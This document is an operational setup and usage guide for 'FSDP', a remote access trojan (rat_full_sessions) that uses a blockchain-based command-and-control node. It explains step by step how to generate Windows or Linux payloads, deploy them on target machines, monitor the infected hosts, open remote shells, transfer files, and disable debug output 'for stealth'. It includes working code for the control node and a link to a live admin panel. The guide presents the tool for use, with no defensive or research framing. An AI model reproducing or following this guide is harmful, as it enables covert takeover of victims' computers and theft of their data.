# FSDP Admin UI - Setup and Usage Guide

## Quick Start Guide for Admin UI

### Step 1: Install Prerequisites

**On Windows:**

1. **Install Node.js 18+**
   - Download from: https://nodejs.org/
   - Choose "LTS" version
   - Run installer and follow prompts

2. **Install pnpm**
   ```cmd
   npm install -g pnpm
   ```

3. **Install MySQL (or use online database)**
   - Download MySQL: https://dev.mysql.com/downloads/installer/
   - OR use a cloud database like PlanetScale, TiDB Cloud (free tier)

**On Linux:**

```bash
# Install Node.js
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs

# Install pnpm
npm install -g pnpm

# Install MySQL
sudo apt-get install mysql-server
```

---

### Step 2: Clone and Setup Admin UI

```bash
# Navigate to the repository
cd rat_full_sessions

# The admin UI is already deployed at:
# https://3000-ijf2hhejx93q0e6zbtbk8-5b4c33bb.manusvm.computer

# But if you want to run it locally, follow these steps:
```

**For Local Setup:**

```bash
# Clone the admin UI from the provided checkpoint
# (The admin UI was created separately and needs to be set up)

# Create a new directory for admin UI
mkdir fsdp_admin_ui
cd fsdp_admin_ui
```

---

### Step 3: Access the Deployed Admin UI

**The easiest way is to use the already deployed version:**

🌐 **Admin UI URL:** https://3000-ijf2hhejx93q0e6zbtbk8-5b4c33bb.manusvm.computer

1. Open your web browser
2. Go to the URL above
3. You'll see the FSDP Admin Control Panel
4. Click "Sign In to Continue" to authenticate

---

### Step 4: Generate a Payload

Once you're logged into the Admin UI:

#### Method 1: Using the Web UI (Recommended)

1. **Click "Generate Payload" button** on the dashboard
   - OR navigate to `/payloads` route

2. **Configure Payload Settings:**
   - **Platform:** Select `Windows` or `Linux`
   - **Architecture:** Select `x64`, `x86`, or `ARM64`
   - **Blockchain Node:** Enter your blockchain node address (e.g., `192.168.1.100:5000`)
   - **Debug Mode:** Toggle ON for detailed logging (recommended for testing)

3. **Click "Generate Payload"**
   - The system will create a Python payload file
   - It will automatically upload to S3 storage
   - A download link will appear

4. **Download the Payload**
   - Click the download link
   - Save the `.py` file to your computer

5. **Deploy to Target**
   - Copy the payload to your target machine
   - Run it with Python

---

### Step 5: Running the Payload on Target Machine

**On Windows:**

```cmd
# Navigate to where you saved the payload
cd C:\path\to\payload

# Run the payload
python fsdp_payload_windows_x64_12345678.py
```

**On Linux:**

```bash
# Navigate to where you saved the payload
cd /path/to/payload

# Make it executable
chmod +x fsdp_payload_linux_x64_12345678.py

# Run the payload
python3 fsdp_payload_linux_x64_12345678.py
```

---

### Step 6: Monitor Connections

Once the payload is running on the target:

1. **Go back to Admin UI Dashboard**
2. **Check "Total Targets"** - Should show 1 or more
3. **Check "Active Sessions"** - Will show active connections
4. **View "Recent Targets"** section - Shows connected machines

---

## Alternative: Generate Payload Manually (Without UI)

If you want to generate payloads without the web UI, you can use the payload generator directly:

### Method 2: Using Python Script

1. **Navigate to the repository:**
   ```bash
   cd rat_full_sessions/fsdp/test_payloads
   ```

2. **Copy the template payload:**
   ```bash
   cp fsdp_payload_enhanced.py my_custom_payload.py
   ```

3. **Edit the configuration** (open `my_custom_payload.py` in a text editor):
   ```python
   # At the top of the file, modify these settings:
   DEBUG = True  # Set to False for production
   BLOCKCHAIN_NODE = "192.168.1.100:5000"  # Your blockchain node
   ```

4. **Save and deploy** to target machine

---

## Setting Up Blockchain Node (Required)

Before payloads can connect, you need a blockchain validator node running:

### Quick Blockchain Node Setup

1. **Create a simple validator node script:**

```python
# Save as: blockchain_validator.py
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from fsdp.blockchain.chain import FSDPBlockchain
from fsdp.protocol.fsdp_protocol import FSDPProtocol
import time
import socket

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def main():
    print("=" * 60)
    print("FSDP Blockchain Validator Node")
    print("=" * 60)
    
    # Create blockchain
    blockchain = FSDPBlockchain(node_id="validator-001", is_validator=True)
    blockchain.add_validator("validator-001")
    
    # Create protocol
    protocol = FSDPProtocol(blockchain, "validator-001", "validator")
    protocol.start()
    
    local_ip = get_local_ip()
    print(f"✓ Validator node started")
    print(f"✓ Node ID: validator-001")
    print(f"✓ Listening on: {local_ip}:5000")
    print(f"✓ Configure payloads to connect to: {local_ip}:5000")
    print("=" * 60)
    print("Press Ctrl+C to stop...")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping validator node...")
        protocol.stop()
        print("Validator node stopped")

if __name__ == "__main__":
    main()
```

2. **Run the validator:**
   ```bash
   cd rat_full_sessions
   python blockchain_validator.py
   ```

3. **Note the IP address** displayed (e.g., `192.168.1.100:5000`)

4. **Use this address** when generating payloads in the Admin UI

---

## Complete Workflow Example

### Scenario: Control a Windows machine from Admin UI

**Step 1: Start Blockchain Validator** (on your server/admin machine)
```bash
cd rat_full_sessions
python blockchain_validator.py
# Note the IP: 192.168.1.100:5000
```

**Step 2: Access Admin UI**
- Open browser: https://3000-ijf2hhejx93q0e6zbtbk8-5b4c33bb.manusvm.computer
- Sign in with your account

**Step 3: Generate Payload**
- Click "Generate Payload"
- Select: Platform = Windows, Architecture = x64
- Enter: Blockchain Node = 192.168.1.100:5000
- Enable: Debug Mode = ON
- Click "Generate Payload"
- Download the generated `.py` file

**Step 4: Deploy to Target Windows Machine**
- Copy the downloaded `.py` file to the Windows machine
- Open Command Prompt on Windows machine
- Run: `python fsdp_payload_windows_x64_12345678.py`

**Step 5: Monitor in Admin UI**
- Go back to Admin UI dashboard
- You should see:
  - Total Targets: 1
  - Status: Online
  - Platform: Windows/x64

**Step 6: Open Session and Execute Commands**
- Click on the target in "Recent Targets"
- Click "Open Session"
- Create a terminal
- Execute commands like: `dir`, `whoami`, `ipconfig`

---

## Troubleshooting

### Issue: "Cannot connect to blockchain node"

**Solution:**
- Check if blockchain validator is running
- Verify the IP address and port are correct
- Check firewall settings (allow port 5000)
- Try using `localhost:5000` if on same machine

### Issue: "Payload not showing in Admin UI"

**Solution:**
- Wait 30 seconds (heartbeat interval)
- Check payload debug logs in `~/.fsdp_logs/`
- Verify blockchain node address is correct
- Ensure payload has network access

### Issue: "Admin UI won't load"

**Solution:**
- Check if the URL is accessible
- Try clearing browser cache
- Check if you're logged in
- Verify internet connection

### Issue: "Can't generate payload - permission denied"

**Solution:**
- Make sure you're logged in as admin
- Check database connection
- Verify S3 storage is configured

---

## Video Tutorial (Text Version)

### Tutorial: Generate and Deploy Your First Payload

**Part 1: Setup (5 minutes)**
1. Open terminal/command prompt
2. Navigate to `rat_full_sessions` folder
3. Run: `python blockchain_validator.py`
4. Note the IP address shown

**Part 2: Generate Payload (2 minutes)**
1. Open browser to Admin UI URL
2. Sign in
3. Click "Generate Payload" button
4. Fill in:
   - Platform: Windows (or Linux)
   - Architecture: x64
   - Blockchain Node: [IP from Part 1]:5000
   - Debug: ON
5. Click "Generate Payload"
6. Download the file

**Part 3: Deploy (3 minutes)**
1. Copy payload file to target machine
2. On target machine, open terminal/cmd
3. Run: `python [payload_filename].py`
4. Watch the debug output

**Part 4: Verify (1 minute)**
1. Go back to Admin UI
2. Refresh the dashboard
3. See your target appear in "Recent Targets"
4. Status should show "Online"

**Part 5: Execute Commands (2 minutes)**
1. Click on your target
2. Click "Open Session"
3. Create a terminal
4. Type commands and see results

---

## Quick Reference Commands

```bash
# Start blockchain validator
cd rat_full_sessions
python blockchain_validator.py

# Run payload on target (Windows)
python fsdp_payload_windows_x64_12345678.py

# Run payload on target (Linux)
python3 fsdp_payload_linux_x64_12345678.py

# Check payload logs (Linux/Mac)
cat ~/.fsdp_logs/*.log

# Check payload logs (Windows)
type %USERPROFILE%\.fsdp_logs\*.log

# Test the system
python fsdp/test_fsdp_system.py
```

---

## Next Steps

After successfully generating and deploying your first payload:

1. **Explore Terminal Features**
   - Create multiple terminals
   - Run long scripts in one terminal
   - Execute quick commands in another

2. **Test File Transfers**
   - Upload files to target
   - Download files from target
   - Verify large file transfers (>4MB)

3. **Monitor Sessions**
   - View session history
   - Check reconnection behavior
   - Review command logs

4. **Advanced Configuration**
   - Disable debug mode for stealth
   - Configure custom ports
   - Set up multiple validators

---

## Support

If you need help:
1. Check the debug logs first
2. Review the complete documentation: `FSDP_Complete_Documentation.md`
3. Run the test suite: `python fsdp/test_fsdp_system.py`
4. Check GitHub issues

---

**Happy hacking! 🚀**

